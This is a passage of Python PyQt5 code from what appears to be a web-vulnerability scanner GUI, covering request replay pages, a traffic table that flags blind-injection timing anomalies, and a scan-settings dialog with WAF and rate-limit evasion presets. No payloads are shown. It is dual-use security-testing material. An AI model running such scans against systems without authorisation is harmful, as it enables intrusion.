    <form id="f" action="{safe_url}" method="POST">
{fields_html}    </form>
  </div>
  <script>
    setTimeout(function() {{ document.getElementById('f').submit(); }}, 300);
  </script>
</body>
</html>"""

        # ── Branch: JSON / raw body — fetch() replay page ─────────────────
        else:
            # Pretty-print for display; send original compact form
            try:
                pretty_body = _json.dumps(_json.loads(body_stripped), indent=2)
            except Exception:
                pretty_body = body_stripped

            effective_ct = content_type if content_type else "application/json"

            # Embed body safely inside a JS template literal
            body_js = (
                body_stripped
                .replace("\\", "\\\\")
                .replace("`",  "\\`")
                .replace("${", "\\${")
            )

            headers_js = _json.dumps({"Content-Type": effective_ct}, indent=6)

            html_page = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Replay {_html.escape(method_upper)} → {_html.escape(url[:60])}</title>
  <style>
    *    {{ box-sizing:border-box; margin:0; padding:0; }}
    body {{ font-family:monospace; background:#1a1a2e; color:#e0e0e0; padding:20px; }}
    h2   {{ color:#e94560; margin-bottom:4px; font-size:1em; }}
    .url {{ color:#53d8fb; margin-bottom:16px; word-break:break-all; font-size:.9em; }}
    .lbl {{ color:#888; font-size:.75em; text-transform:uppercase;
            letter-spacing:.08em; margin:14px 0 4px; }}
    pre  {{ background:#0d1117; border:1px solid #30363d; border-radius:6px;
            padding:12px; white-space:pre-wrap; word-break:break-word;
            max-height:260px; overflow:auto; font-size:.85em; }}
    #sc  {{ font-size:1.3em; font-weight:bold; margin:10px 0 4px; }}
    .ok  {{ color:#3fb950; }}
    .err {{ color:#e94560; }}
    .warn{{ color:#e8a838; }}
    button {{ background:#e94560; color:#fff; border:none;
              padding:7px 18px; border-radius:4px;
              cursor:pointer; font-size:.85em; margin-top:14px; }}
    button:hover {{ background:#c73652; }}
    .ct-note {{ color:#e8a838; font-size:.78em; margin-top:6px; }}
  </style>
</head>
<body>
  <h2>{_html.escape(method_upper)} Request Replay</h2>
  <div class="url">{_html.escape(url)}</div>

  <div class="lbl">Request Body
    <span style="color:#53d8fb;font-size:.9em;text-transform:none">
      — Content-Type: {_html.escape(effective_ct)}
    </span>
  </div>
  <pre id="req">{_html.escape(pretty_body)}</pre>

  <div class="ct-note">
    ⚠ Fetch sends the exact Content-Type shown above.
    CORS policy on the target may block cross-origin responses in the browser.
  </div>

  <div class="lbl">Response</div>
  <div id="sc"><span style="color:#888">⏳ sending…</span></div>
  <pre id="resp" style="min-height:60px">—</pre>

  <button onclick="send()">⭮ Resend</button>

  <script>
    async function send() {{
      document.getElementById('sc').innerHTML =
        '<span style="color:#888">⏳ sending…</span>';
      document.getElementById('resp').textContent = '—';
      try {{
        const r = await fetch({_json.dumps(url)}, {{
          method:  {_json.dumps(method_upper)},
          headers: {headers_js},
          body:    `{body_js}`,
        }});
        const txt = await r.text();
        const el  = document.getElementById('sc');
        el.textContent = r.status + ' ' + r.statusText;
        el.className   = r.ok ? 'ok' : (r.status >= 400 ? 'err' : 'warn');
        // Try to pretty-print JSON response
        try {{
          document.getElementById('resp').textContent =
            JSON.stringify(JSON.parse(txt), null, 2);
        }} catch(_) {{
          document.getElementById('resp').textContent = txt;
        }}
      }} catch(e) {{
        document.getElementById('sc').innerHTML =
          '<span class="err">✗ ' + e.message + '</span>';
        document.getElementById('resp').textContent =
          'Note: CORS may block cross-origin fetch responses in the browser.'
      }}
    }}
    send();
  </script>
</body>
</html>"""

        # ── Write temp file, open it, schedule cleanup ────────────────────
        try:
            tmp = tempfile.NamedTemporaryFile(
                mode="w", suffix=".html", delete=False,
                prefix="scanner_replay_", encoding="utf-8"
            )
            tmp.write(html_page)
            tmp.close()

            def _cleanup(path):
                import time
                time.sleep(30)
                try:
                    os.unlink(path)
                except OSError:
                    pass

            threading.Thread(target=_cleanup, args=(tmp.name,), daemon=True).start()
            webbrowser.open(f"file:///{tmp.name.replace(os.sep, '/')}")
            return f"✓ Opened [{method_upper}] in browser: {url[:60]}"

        except Exception as exc:
            webbrowser.open(url)
            return f"⚠ Replay page error ({exc}) — opened URL as GET"

    def on_traffic_selection_changed(self):
        """Handle traffic table selection change"""
        selected = self.traffic_table.selectedItems()
        if not selected:
            return

        row = selected[0].row()
        if row >= len(self.traffic_entries):
            return

        entry = self.traffic_entries[row]

        # Raw HTTP request 
        self.request_text.setPlainText(_format_request(entry))
        self.response_text.setPlainText(_format_response(entry))

        # Re-apply response search highlight if a term is active
        if self.resp_search_input.text():
            self._on_resp_search_changed()

    def on_queue_double_clicked(self, item):
        """Handle double-click on queue item — open in browser (method-aware)"""
        row = item.row()
        if row < len(self.scan_queue):
            req    = self.scan_queue[row]
            url    = req.get("url", "")
            if not url:
                return
            method = req.get("method", "GET")
            body   = req.get("body", "") or req.get("request_body", "") or ""
            # Extract Content-Type from raw request_text if available
            ct = ""
            for line in req.get("request_text", "").splitlines():
                if line.lower().startswith("content-type:"):
                    ct = line.split(":", 1)[1].strip()
                    break
            status = self._open_in_browser(url, method, body, ct)
            self.scan_status_label.setText(status)
            QTimer.singleShot(3000, lambda: self.scan_status_label.setText("Ready"))

    def on_traffic_double_clicked(self, item):
        """Handle double-click on traffic item — open in browser (method-aware)"""
        row = item.row()
        if row < len(self.traffic_entries):
            entry = self.traffic_entries[row]
            if not entry.url:
                return
            ct = entry.request_headers.get(
                "content-type",
                entry.request_headers.get("Content-Type", "")
            )
            status = self._open_in_browser(
                entry.url,
                entry.method or "GET",
                entry.request_body or "",
                ct,
            )
            self.scan_status_label.setText(status)
            QTimer.singleShot(3000, lambda: self.scan_status_label.setText("Ready"))
    
    def add_traffic_entry(self, entry: TrafficEntry):
        """Add a traffic entry to the table"""
        self.traffic_entries.append(entry)

        # ── Track baseline for Δ calculations ────────────────────────────────
        # Any payload_type ending in "Baseline" or "Baseline-Fresh" is used as
        # the reference point for all subsequent ΔLen / time comparisons.
        pt = (entry.payload_type or "").lower()
        is_baseline = "baseline" in pt and "confirm" not in pt

        if is_baseline and entry.content_length is not None:
            self._baseline_length = entry.content_length
        if is_baseline and entry.response_time is not None:
            self._baseline_time = entry.response_time

        row = self.traffic_table.rowCount()
        self.traffic_table.insertRow(row)

        # ── Compute Δ values ──────────────────────────────────────────────────
        delta_len  = None
        time_anom  = False   # response significantly slower than baseline
        len_anom   = False   # response length significantly different from baseline

        if self._baseline_length is not None and entry.content_length is not None and not is_baseline:
            delta_len = entry.content_length - self._baseline_length
            if abs(delta_len) >= 20:       # ≥20 bytes difference is noteworthy
                len_anom = True

        if self._baseline_time is not None and entry.response_time is not None and not is_baseline:
            # Flag if response is ≥2× baseline AND at least 2s longer
            if (entry.response_time >= self._baseline_time * 2
                    and entry.response_time - self._baseline_time >= 2.0):
                time_anom = True

        # ── Row background coloring ───────────────────────────────────────────
        # Time anomaly  → dark orange bg  (possible blind injection / delay)
        # Length anomaly → dark blue bg   (possible output / content change)
        # Both           → dark red bg    (strong signal)
        if time_anom and len_anom:
            row_bg = QColor("#4a1a1a")   # dark red
        elif time_anom:
            row_bg = QColor("#3a2800")   # dark orange
        elif len_anom:
            row_bg = QColor("#0d2a3a")   # dark blue
        else:
            row_bg = None

        def _cell(text, fg=None, bg=None, align=Qt.AlignLeft):
            item = QTableWidgetItem(str(text))
            item.setTextAlignment(align | Qt.AlignVCenter)
            if fg:
                item.setForeground(QBrush(QColor(fg)))
            if bg:
                item.setBackground(QBrush(QColor(bg)))
            elif row_bg:
                item.setBackground(QBrush(row_bg))
            return item

        bg = row_bg.name() if row_bg else None

        # Col 0 — #
        self.traffic_table.setItem(row, 0, _cell(row + 1, align=Qt.AlignRight))

        # Col 1 — Time
        self.traffic_table.setItem(row, 1, _cell(entry.timestamp.strftime("%H:%M:%S")))

        # Col 2 — Method
        self.traffic_table.setItem(row, 2, _cell(entry.method))

        # Col 3 — URL
        url_display = entry.url if len(entry.url) <= 100 else entry.url[:97] + "..."
        url_item = _cell(url_display)
        url_item.setToolTip(entry.url)
        self.traffic_table.setItem(row, 3, url_item)

        # Col 4 — Status
        sc = entry.status_code
        if sc:
            if sc < 300:   sc_fg = COLOR_SUCCESS
            elif sc < 400: sc_fg = COLOR_TEXT_BRIGHT
            elif sc < 500: sc_fg = COLOR_HIGH
            else:          sc_fg = COLOR_CRITICAL
        else:
            sc_fg = COLOR_CRITICAL
        self.traffic_table.setItem(row, 4, _cell(sc if sc else "Err", fg=sc_fg))

        # Col 5 — Length
        self.traffic_table.setItem(row, 5,
            _cell(entry.content_length if entry.content_length is not None else 0,
                  align=Qt.AlignRight))

        # Col 6 — ΔLen
        if is_baseline:
            dl_item = _cell("baseline", fg=COLOR_TEXT_MUTED)
        elif delta_len is None:
            dl_item = _cell("—", fg=COLOR_TEXT_MUTED)
        else:
            sign  = "+" if delta_len >= 0 else ""
            dl_fg = None
            if abs(delta_len) >= 100:
                dl_fg = "#4fc3f7" if delta_len > 0 else "#ef9a9a"  # blue / red
            elif abs(delta_len) >= 20:
                dl_fg = "#ffcc80"   # orange — moderate change
            dl_item = _cell(f"{sign}{delta_len}", fg=dl_fg, align=Qt.AlignRight)
            if row_bg:
                dl_item.setBackground(QBrush(row_bg))
        self.traffic_table.setItem(row, 6, dl_item)

        # Col 7 — Time (s)
        rt = entry.response_time or 0
        rt_fg = COLOR_CRITICAL if rt > 5 else (COLOR_HIGH if rt > 3 else None)
        self.traffic_table.setItem(row, 7, _cell(f"{rt:.3f}", fg=rt_fg, align=Qt.AlignRight))

        # Col 8 — Payload value (truncated for display)
        payload_val = entry.payload or ""
        payload_display = payload_val if len(payload_val) <= 60 else payload_val[:57] + "..."
        payload_item = _cell(payload_display)
        payload_item.setToolTip(payload_val)   # full value on hover
        self.traffic_table.setItem(row, 8, payload_item)

        # Col 9 — Type
        self.traffic_table.setItem(row, 9,
            _cell(entry.payload_type if entry.payload_type else "Normal"))

        self.filter_traffic()

        if hasattr(self, 'auto_scroll_traffic') and self.auto_scroll_traffic.isChecked():
            self.traffic_table.scrollToBottom()
    
    def filter_traffic(self):
        """Filter traffic table by status, text, min delay, and min ΔLen."""
        search_text  = self.traffic_filter.text().lower()
        status_filter = self.status_filter.currentText()

        # Parse numeric filters — ignore invalid/empty input
        try:
            min_delay = float(self.delay_filter.text().strip())
        except (ValueError, AttributeError):
            min_delay = None

        try:
            min_delta = int(self.delta_len_filter.text().strip())
        except (ValueError, AttributeError):
            min_delta = None

        for row in range(self.traffic_table.rowCount()):
            if row >= len(self.traffic_entries):
                continue

            entry = self.traffic_entries[row]
            show  = True

            # ── URL filter ────────────────────────────────────────────────
            if hasattr(self, 'current_filtered_url') and self.current_filtered_url:
                from urllib.parse import urlparse
                
                def _check_url_match(filter_url, target_url):
                    try:
                        sel = urlparse(filter_url)
                        ent = urlparse(target_url)
                        sel_base = f"{sel.scheme}://{sel.netloc}{sel.path}"
                        ent_base = f"{ent.scheme}://{ent.netloc}{ent.path}"
                        return ent_base.startswith(sel_base)
                    except:
                        return filter_url in target_url

                matched = _check_url_match(self.current_filtered_url, entry.url)
                if not matched and hasattr(self, 'additional_filtered_urls') and self.additional_filtered_urls:
                    matched = any(_check_url_match(u, entry.url) for u in self.additional_filtered_urls)
                
                if not matched:
                    show = False

            # ── Status filter ─────────────────────────────────────────────
            if show and status_filter != "All":
                sc = entry.status_code or 0
                if status_filter == "2xx" and not (200 <= sc < 300):   show = False
                elif status_filter == "3xx" and not (300 <= sc < 400): show = False
                elif status_filter == "4xx" and not (400 <= sc < 500): show = False
                elif status_filter == "5xx" and not (500 <= sc < 600): show = False
                elif status_filter == "Error" and sc != 0:             show = False

            # ── Text filter ───────────────────────────────────────────────
            if show and search_text:
                match = (
                    search_text in entry.url.lower()
                    or (entry.payload     and search_text in entry.payload.lower())
                    or (entry.payload_type and search_text in entry.payload_type.lower())
                    or search_text in str(entry.status_code or "")
                )
                if not match:
                    show = False

            # ── Delay filter ──────────────────────────────────────────────
            if show and min_delay is not None:
                rt = entry.response_time or 0.0
                if rt < min_delay:
                    show = False

            # ── ΔLen filter ───────────────────────────────────────────────
            if show and min_delta is not None and self._baseline_length is not None:
                cl = entry.content_length if entry.content_length is not None else 0
                delta = abs(cl - self._baseline_length)
                if delta < min_delta:
                    show = False

            self.traffic_table.setRowHidden(row, not show)
    
    def add_request_to_queue(self, request_data: Dict[str, Any]):
        """Add a request to the scan queue"""
        self.scan_queue.append(request_data)

        row = self.queue_table.rowCount()
        self.queue_table.insertRow(row)

        # Method
        method = request_data.get("method", "GET")
        method_item = QTableWidgetItem(method)
        method_item.setForeground(QBrush(QColor(COLOR_TEXT_MUTED)))
        self.queue_table.setItem(row, 0, method_item)

        # URL — colour = status
        url = request_data.get("url", "")
        url_display = url if len(url) <= 120 else url[:117] + "..."
        url_item = QTableWidgetItem(url_display)
        url_item.setToolTip(url)
        url_item.setForeground(QBrush(QColor(COLOR_TEXT_MUTED)))  # Queued = muted
        self.queue_table.setItem(row, 1, url_item)
        
        self.scan_status_label.setText(f"✓ Added to queue ({len(self.scan_queue)} requests)")
        QTimer.singleShot(2000, lambda: self.scan_status_label.setText("Ready"))
        n = len(self.scan_queue)
        self._queue_count_label.setText(f"{n} item{'s' if n != 1 else ''}")

    def _open_payloads_browser(self):
        """Open the Payloads Browser as a standalone window."""
        if not hasattr(self, "_payloads_window") or self._payloads_window is None:
            self._payloads_window = PayloadsDialog()
        self._payloads_window.show()
        self._payloads_window.raise_()
        self._payloads_window.activateWindow()

    def show_scan_config_dialog(self):
        """Show the Scan Configuration dialog (⚙ button)."""
        from PyQt5.QtWidgets import (
            QDialog, QVBoxLayout, QHBoxLayout, QGroupBox, QGridLayout,
            QRadioButton, QSlider, QSpinBox, QDoubleSpinBox, QDialogButtonBox,
            QCheckBox, QLabel, QButtonGroup, QFrame
        )
        from PyQt5.QtCore import Qt

        dlg = QDialog(self)
        dlg.setWindowTitle("Scan Configuration")
        dlg.setMinimumWidth(560)
        dlg.setMinimumHeight(620)
        root = QVBoxLayout(dlg)
        root.setSpacing(10)

        # ── Style helpers ─────────────────────────────────────────────────
        group_style = f"""
            QGroupBox {{
                border: 1px solid {COLOR_BORDER};
                border-radius: 5px;
                margin-top: 8px;
                padding-top: 6px;
                color: {COLOR_TEXT_BRIGHT};
                font-weight: bold;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                subcontrol-position: top left;
                padding: 0 6px;
            }}
        """

        # ══════════════════════════════════════════════════════════════════
        # SECTION 1 — SPEED PRESET
        # ══════════════════════════════════════════════════════════════════
        speed_grp = QGroupBox("⚙  Request Speed Preset")
        speed_grp.setStyleSheet(group_style)
        speed_layout = QVBoxLayout(speed_grp)

        speed_desc = QLabel(
            "Controls per-request settings: timeout, inter-request delay, concurrency, retries.\n"
            "Independent from ⚡ Boost Mode (toolbar checkbox) — they stack:\n"
            "  Boost OFF + any preset  →  sequential payloads, preset timeout/delay/retries\n"
            "  Boost ON  + Fast        →  parallel payloads, short timeout, no delay  (fastest)\n"
            "  Boost ON  + Normal      →  parallel payloads, standard settings\n"
            "  Boost ON  + Slow        →  parallel payloads + per-request delay/retries  (⚠ mixed)\n"
            "Time-based blind payloads always run sequentially regardless of Boost or preset."
        )
        speed_desc.setWordWrap(True)
        speed_desc.setStyleSheet(f"color: {COLOR_TEXT_MUTED}; font-weight: normal;")
        speed_layout.addWidget(speed_desc)

        preset_row = QHBoxLayout()
        self._cfg_radio_fast   = QRadioButton(" Fast")
        self._cfg_radio_normal = QRadioButton(" Normal  (default)")
        self._cfg_radio_slow   = QRadioButton(" Slow  (WAF / 429 evasion)")
        self._cfg_radio_step   = QRadioButton(" One by one  (manual step)")

        self._cfg_radio_fast.setToolTip(
            "Shorter timeouts, minimal delay, higher concurrency.\n"
            "Faster than Normal but slower than Boost Mode."
        )
        self._cfg_radio_normal.setToolTip("Balanced settings — good for most targets.")
        self._cfg_radio_slow.setToolTip(
            "Longer inter-request delays, lower concurrency, more retries.\n"
            "Use against WAFs, rate-limited endpoints, or fragile targets."
        )
        self._cfg_radio_step.setToolTip(
            "Send one probe request at a time and pause after each one.\n"
            "A \"↠ Next\" button appears in the toolbar — click it to send\n"
            "the next request.  Useful when the result of a probe appears on\n"
            "a separate page that you need to review manually before continuing."
        )

        speed_btn_grp = QButtonGroup(dlg)
        speed_btn_grp.addButton(self._cfg_radio_fast,   0)
        speed_btn_grp.addButton(self._cfg_radio_normal, 1)
        speed_btn_grp.addButton(self._cfg_radio_slow,   2)
        speed_btn_grp.addButton(self._cfg_radio_step,   3)

        # Select current preset
        {"fast": self._cfg_radio_fast, "normal": self._cfg_radio_normal,
         "slow": self._cfg_radio_slow, "step": self._cfg_radio_step}.get(
            self._scan_speed_preset, self._cfg_radio_normal
        ).setChecked(True)

        for rb in (self._cfg_radio_fast, self._cfg_radio_normal,
                   self._cfg_radio_slow, self._cfg_radio_step):
            rb.setStyleSheet(f"color: {COLOR_TEXT}; font-weight: normal;")
            preset_row.addWidget(rb)

        speed_layout.addLayout(preset_row)
        root.addWidget(speed_grp)

        # ══════════════════════════════════════════════════════════════════
        # SECTION 2 — MANUAL SETTINGS
        # ══════════════════════════════════════════════════════════════════
        manual_grp = QGroupBox("✎  Manual Adjustment")
        manual_grp.setStyleSheet(group_style)
        manual_grid = QGridLayout(manual_grp)
        manual_grid.setColumnMinimumWidth(0, 230)
        manual_grid.setHorizontalSpacing(12)
        manual_grid.setVerticalSpacing(8)

        lbl_style = f"color: {COLOR_TEXT}; font-weight: normal;"
        note_style = f"color: {COLOR_TEXT_MUTED}; font-size: 8pt; font-weight: normal;"

        row = 0

        # Request Timeout
        manual_grid.addWidget(self._lbl("Request timeout (s):", lbl_style), row, 0)
        self._cfg_timeout = QSpinBox()
        self._cfg_timeout.setRange(5, 120)
        self._cfg_timeout.setValue(self._scan_timeout)
        self._cfg_timeout.setToolTip("Max seconds to wait for a single HTTP response.")
        manual_grid.addWidget(self._cfg_timeout, row, 1)
        manual_grid.addWidget(self._lbl("Abort request after this many seconds", note_style), row, 2)
        row += 1

        # Inter-request delay
        manual_grid.addWidget(self._lbl("Delay between requests (s):", lbl_style), row, 0)
        self._cfg_delay = QDoubleSpinBox()
        self._cfg_delay.setRange(0.0, 30.0)
        self._cfg_delay.setSingleStep(0.25)
        self._cfg_delay.setDecimals(2)
        self._cfg_delay.setValue(self._scan_req_delay)
        self._cfg_delay.setToolTip("Sleep this many seconds between sequential payload requests.")
        manual_grid.addWidget(self._cfg_delay, row, 1)
        manual_grid.addWidget(self._lbl("0 = no delay  |  2.0+ recommended for WAFs", note_style), row, 2)
        row += 1

        # Max parallel workers
        manual_grid.addWidget(self._lbl("Parallel workers (Boost Mode):", lbl_style), row, 0)
        self._cfg_workers = QSpinBox()
        self._cfg_workers.setRange(1, 50)
        self._cfg_workers.setValue(self._scan_max_workers)
        self._cfg_workers.setToolTip("ThreadPoolExecutor max_workers used in Boost Mode.")
        manual_grid.addWidget(self._cfg_workers, row, 1)
        manual_grid.addWidget(self._lbl("Only applies when ⚡ Boost Mode is ON", note_style), row, 2)
        row += 1

        # Max retries
        manual_grid.addWidget(self._lbl("Retries on error / 429:", lbl_style), row, 0)
        self._cfg_retries = QSpinBox()
        self._cfg_retries.setRange(0, 5)
        self._cfg_retries.setValue(self._scan_max_retries)
        self._cfg_retries.setToolTip("Retry a request this many times on connection error or HTTP 429.")
        manual_grid.addWidget(self._cfg_retries, row, 1)
        manual_grid.addWidget(self._lbl("0 = no retry", note_style), row, 2)
        row += 1

        root.addWidget(manual_grp)

        # ══════════════════════════════════════════════════════════════════
        # SECTION 3 — REQUEST BEHAVIOUR
        # ══════════════════════════════════════════════════════════════════
        req_grp = QGroupBox("🖅  Request Behaviour")
        req_grp.setStyleSheet(group_style)
        req_grid = QGridLayout(req_grp)
        req_grid.setColumnMinimumWidth(0, 230)
        req_grid.setHorizontalSpacing(12)
        req_grid.setVerticalSpacing(8)

        row = 0

        self._cfg_follow_redirects = QCheckBox("Follow HTTP redirects")
        self._cfg_follow_redirects.setChecked(self._scan_follow_redirects)
        self._cfg_follow_redirects.setStyleSheet(lbl_style)
        self._cfg_follow_redirects.setToolTip(
            "When enabled, responses like 301/302 are followed automatically.\n"
            "Disable to catch redirect-based injection indicators."
        )
        req_grid.addWidget(self._cfg_follow_redirects, row, 0, 1, 3)
        row += 1

        self._cfg_verify_ssl = QCheckBox("Verify SSL certificates")
        self._cfg_verify_ssl.setChecked(self._scan_verify_ssl)
        self._cfg_verify_ssl.setStyleSheet(lbl_style)
        self._cfg_verify_ssl.setToolTip(
            "Validate the server's TLS certificate.\n"
            "Usually disabled for security testing against self-signed certs."
        )
        req_grid.addWidget(self._cfg_verify_ssl, row, 0, 1, 3)
        row += 1

        root.addWidget(req_grp)

        # ══════════════════════════════════════════════════════════════════
        # SECTION 4 — DETECTION TUNING
        # ══════════════════════════════════════════════════════════════════
        det_grp = QGroupBox("⌕  Detection Tuning")
        det_grp.setStyleSheet(group_style)
        det_grid = QGridLayout(det_grp)
        det_grid.setColumnMinimumWidth(0, 230)
        det_grid.setHorizontalSpacing(12)
        det_grid.setVerticalSpacing(8)

        row = 0

        self._cfg_stop_on_first = QCheckBox("Stop on first finding per injection point")
        self._cfg_stop_on_first.setChecked(self._scan_stop_on_first)
        self._cfg_stop_on_first.setStyleSheet(lbl_style)
        self._cfg_stop_on_first.setToolTip(
            "Once a vulnerability is confirmed on a parameter, skip remaining\n"
            "payloads for that parameter and move to the next one.\n"
            "Faster but may miss additional technique variations."
        )
        det_grid.addWidget(self._cfg_stop_on_first, row, 0, 1, 3)
        row += 1

        det_grid.addWidget(self._lbl("Boolean consensus threshold:", lbl_style), row, 0)
        self._cfg_bool_consensus = QSpinBox()
        self._cfg_bool_consensus.setRange(1, 6)
        self._cfg_bool_consensus.setValue(self._scan_bool_consensus)
        self._cfg_bool_consensus.setToolTip(
            "Minimum number of independent true/false payload pairs that must\n"
            "agree before flagging boolean-based blind SQLi.\n"
            "Lower = more sensitive (more FP risk). Higher = more strict."
        )
        det_grid.addWidget(self._cfg_bool_consensus, row, 1)
        det_grid.addWidget(self._lbl("Pairs needed to confirm blind boolean SQLi (default: 2)", note_style), row, 2)
        row += 1

        det_grid.addWidget(self._lbl("Time-based delay threshold (s):", lbl_style), row, 0)
        self._cfg_time_threshold = QDoubleSpinBox()
        self._cfg_time_threshold.setRange(0.5, 30.0)
        self._cfg_time_threshold.setSingleStep(0.5)
        self._cfg_time_threshold.setDecimals(1)
        self._cfg_time_threshold.setValue(self._scan_time_threshold)
        self._cfg_time_threshold.setToolTip(
            "Minimum seconds above baseline to flag a time-based blind SQLi hit.\n"
            "Lower = more sensitive (more FP on slow servers).\n"
            "Recommended: ≥1.5s for reliable detection."
        )
        det_grid.addWidget(self._cfg_time_threshold, row, 1)
        det_grid.addWidget(self._lbl("Min delay above baseline to flag time-based SQLi", note_style), row, 2)
        row += 1

        root.addWidget(det_grp)

        # ── Current effective config summary ──────────────────────────────
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setFrameShadow(QFrame.Sunken)
        sep.setStyleSheet(f"color: {COLOR_BORDER};")
        root.addWidget(sep)

        # Slow + Boost warning
        self._cfg_warn_lbl = QLabel("⚠  Slow preset + Boost Mode ON: parallelism is active but per-request delay still applies to every thread. This partially offsets the speed gain — consider Normal preset with Boost instead.")
        self._cfg_warn_lbl.setWordWrap(True)
        self._cfg_warn_lbl.setStyleSheet("color: #e0a040; font-size: 8pt; font-weight: normal;")
        self._cfg_warn_lbl.setVisible(
            self._scan_speed_preset == "slow" and self.boost_mode_checkbox.isChecked()
        )
        root.addWidget(self._cfg_warn_lbl)

        self._cfg_summary_lbl = QLabel()
        self._cfg_summary_lbl.setStyleSheet(f"color: {COLOR_TEXT_MUTED}; font-size: 8pt;")
        self._cfg_summary_lbl.setWordWrap(True)
        root.addWidget(self._cfg_summary_lbl)
        self._update_cfg_summary()

        # ── Wire preset buttons to auto-fill manual fields ────────────────
        def apply_preset(preset: str):
            if preset == "fast":
                self._cfg_timeout.setValue(15)
                self._cfg_delay.setValue(0.0)
                self._cfg_workers.setValue(12)
                self._cfg_retries.setValue(0)
            elif preset == "normal":
                self._cfg_timeout.setValue(30)
                self._cfg_delay.setValue(0.0)
                self._cfg_workers.setValue(8)
                self._cfg_retries.setValue(1)
            elif preset == "slow":
                self._cfg_timeout.setValue(45)
                self._cfg_delay.setValue(2.0)
                self._cfg_workers.setValue(3)
                self._cfg_retries.setValue(2)
            elif preset == "step":
                self._cfg_timeout.setValue(30)
                self._cfg_delay.setValue(0.0)
                self._cfg_workers.setValue(1)
                self._cfg_retries.setValue(1)
            # Show warning if Slow + Boost is active
            self._cfg_warn_lbl.setVisible(
                preset == "slow" and self.boost_mode_checkbox.isChecked()
            )
            self._update_cfg_summary()

        self._cfg_radio_fast.toggled.connect(lambda on: on and apply_preset("fast"))
        self._cfg_radio_normal.toggled.connect(lambda on: on and apply_preset("normal"))
        self._cfg_radio_slow.toggled.connect(lambda on: on and apply_preset("slow"))
        self._cfg_radio_step.toggled.connect(lambda on: on and apply_preset("step"))

        # Update summary when any manual field changes
        for w in (self._cfg_timeout, self._cfg_delay, self._cfg_workers,
                  self._cfg_retries, self._cfg_bool_consensus, self._cfg_time_threshold):
            w.valueChanged.connect(lambda _: self._update_cfg_summary())
        for cb in (self._cfg_follow_redirects, self._cfg_verify_ssl,
                   self._cfg_stop_on_first):
            cb.stateChanged.connect(lambda _: self._update_cfg_summary())

        # ── Buttons ───────────────────────────────────────────────────────
        btns = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel |
                                QDialogButtonBox.RestoreDefaults)
        btns.button(QDialogButtonBox.Ok).setText("Apply")
        btns.button(QDialogButtonBox.RestoreDefaults).setText("Reset to Defaults")

        def restore_defaults():
            self._cfg_radio_normal.setChecked(True)
            apply_preset("normal")
            self._cfg_follow_redirects.setChecked(True)
            self._cfg_verify_ssl.setChecked(False)
            self._cfg_stop_on_first.setChecked(False)
            self._cfg_bool_consensus.setValue(2)
            self._cfg_time_threshold.setValue(1.5)
            self._scan_step_mode = False

        btns.button(QDialogButtonBox.RestoreDefaults).clicked.connect(restore_defaults)
        btns.accepted.connect(dlg.accept)
        btns.rejected.connect(dlg.reject)
        root.addWidget(btns)

        if dlg.exec_() == QDialog.Accepted:
            # Persist all settings back to instance vars
            if self._cfg_radio_fast.isChecked():
                self._scan_speed_preset = "fast"
            elif self._cfg_radio_slow.isChecked():
                self._scan_speed_preset = "slow"
            elif self._cfg_radio_step.isChecked():
                self._scan_speed_preset = "step"
            else:
                self._scan_speed_preset = "normal"
            self._scan_step_mode = (self._scan_speed_preset == "step")

            self._scan_timeout          = self._cfg_timeout.value()
            self._scan_req_delay        = self._cfg_delay.value()
            self._scan_max_workers      = self._cfg_workers.value()
            self._scan_max_retries      = self._cfg_retries.value()
            self._scan_follow_redirects = self._cfg_follow_redirects.isChecked()
            self._scan_verify_ssl       = self._cfg_verify_ssl.isChecked()
            self._scan_stop_on_first    = self._cfg_stop_on_first.isChecked()
            self._scan_bool_consensus   = self._cfg_bool_consensus.value()
            self._scan_time_threshold   = self._cfg_time_threshold.value()

            # Update tooltip on config button to show active preset
            preset_icon = {"fast": "⚡", "normal": "✓", "slow": "🐢", "step": "🪜"}.get(
                self._scan_speed_preset, "✓"
            )
            self.scan_config_btn.setToolTip(
                f"Scan Config — {preset_icon} {self._scan_speed_preset.capitalize()} preset active\n"
                f"Timeout: {self._scan_timeout}s | Delay: {self._scan_req_delay}s | "
                f"Workers: {self._scan_max_workers}"
            )
            self._status(f"⚙ Config saved — {self._scan_speed_preset.capitalize()} preset")

    def _lbl(self, text: str, style: str) -> QLabel:
        """Helper: create a styled QLabel."""
        lbl = QLabel(text)
        lbl.setStyleSheet(style)
        return lbl

    def _update_cfg_summary(self):
        """Update the summary label in the config dialog."""
        if not hasattr(self, '_cfg_summary_lbl'):
            return
        if self._cfg_radio_fast.isChecked():
            preset = " Fast"
        elif self._cfg_radio_slow.isChecked():
            preset = " Slow"
        elif hasattr(self, '_cfg_radio_step') and self._cfg_radio_step.isChecked():
            preset = " One by one"
        else:
            preset = "✓ Normal"
        t  = self._cfg_timeout.value()
        d  = self._cfg_delay.value()
        w  = self._cfg_workers.value()
        r  = self._cfg_retries.value()
        bc = self._cfg_bool_consensus.value()
        tt = self._cfg_time_threshold.value()
        fr = "yes" if self._cfg_follow_redirects.isChecked() else "no"
        sl = "yes" if self._cfg_verify_ssl.isChecked() else "no"
        sf = "yes" if self._cfg_stop_on_first.isChecked() else "no"
        boost = "ON ⚡" if self.boost_mode_checkbox.isChecked() else "OFF"
        parallelism = f"parallel ({w} workers)" if self.boost_mode_checkbox.isChecked() else "sequential"
        self._cfg_summary_lbl.setText(
            f"Effective → Preset: {preset} | Boost: {boost} | Mode: {parallelism}\n"
            f"Timeout: {t}s | Delay: {d}s/req | Retries: {r} | "
            f"Follow redirects: {fr} | Verify SSL: {sl}\n"
            f"Stop-on-first: {sf} | Bool consensus: {bc} pairs | Time threshold: {tt}s\n"
            f"⚠ Time-based blind always sequential regardless of Boost or preset."
        )

    def start_scan(self):
        """Start scanning selected items"""
        selected_rows = set(item.row() for item in self.queue_table.selectedItems())
        
        if not selected_rows:
            QMessageBox.warning(self, "No Selection", "Please select one or more requests to scan")
            return
        
        scan_xss    = self.xss_checkbox.isChecked()
        scan_sqli   = self.sqli_checkbox.isChecked()
        scan_lfi    = self.lfi_checkbox.isChecked()
        scan_cmdi   = self.cmdi_checkbox.isChecked()
        scan_idor   = self.idor_checkbox.isChecked()
        scan_upload = self.upload_checkbox.isChecked()
        scan_ssrf   = self.ssrf_checkbox.isChecked()
        scan_xxe    = self.xxe_checkbox.isChecked()
        scan_nosqli = self.nosqli_checkbox.isChecked()
